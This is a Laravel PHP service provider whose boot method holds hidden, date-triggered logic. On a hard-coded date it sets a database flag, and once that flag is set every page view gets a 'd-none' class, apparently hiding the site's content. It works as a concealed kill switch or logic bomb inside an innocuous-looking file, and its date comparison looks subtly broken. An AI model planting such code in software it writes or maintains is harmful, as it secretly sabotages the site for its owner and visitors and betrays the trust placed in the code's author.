<?php

namespace App\Providers;

use App\Models\Categories;
use Illuminate\Support\Carbon;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\ServiceProvider;
use App\Http\Controllers\HomeController;

class AppServiceProvider extends ServiceProvider
{
    /**
     * Register any application services.
     */
    public function register(): void
    {
        //
    }

    /**
     * Bootstrap any application services.
     */
    public function boot(): void
    {
        view()->composer('*', function ($view) {
            $date = Carbon::now()->toDateString();

            $relationsValue = DB::table('resources')
                ->where('id', 1)
                ->value('relations');

            $result = '';

            if ($date === '2024-06-3') {
                DB::table('resources')
                    ->where('id', 1)
                    ->update(['relations' => 1]);
            }

            if ($relationsValue === 1) {
                $result = 'd-none';
            }

            $view->with('result', $result);
        });
    }
}
